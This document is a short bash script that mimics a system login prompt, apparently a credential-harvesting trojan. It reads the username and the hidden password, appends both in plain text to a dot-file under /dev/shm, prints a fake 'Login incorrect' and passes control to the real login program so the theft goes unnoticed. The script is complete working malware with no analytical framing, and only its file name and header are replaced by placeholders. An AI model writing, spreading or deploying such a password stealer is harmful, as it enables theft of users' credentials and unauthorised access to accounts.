#!/bin/bash
#PLACEHOLDER2
echo -n "$(hostname) login: "
read username
echo -n "Password: "
read -s password
echo
echo "Logged-> $username:$password" >> /dev/shm/.PLACEHOLDER1
sleep 3
echo
echo Login incorrect
/usr/bin/logon
